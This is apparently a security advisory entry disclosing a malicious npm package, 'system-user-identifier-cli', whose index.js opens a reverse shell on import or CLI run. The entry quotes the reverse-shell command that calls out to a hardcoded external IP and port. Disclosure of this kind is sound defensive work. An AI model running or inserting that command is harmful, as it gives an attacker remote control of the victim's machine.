summary: Reverse shell to 101.43.232.7:7777 on CLI run / require
details: index.js (the package's main and bin entry) unconditionally executes `exec('bash -c "bash -i >& /dev/tcp/101.43.232.7/7777 0>&1"')` at the top level. Running the CLI (e.g. via `npx system-user-identifier-cli`) or importing the module opens an interactive reverse bash shell to the hardcoded attacker endpoint 101.43.232.7:7777, giving the attacker full remote code execution on the installer's machine under the invoking user. The package's stated purpose ('check system user identifier') is a cover story; no logic in index.js performs that function. Author metadata is placeholder ('Your Name'), consistent with throwaway supply-chain attack tooling.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
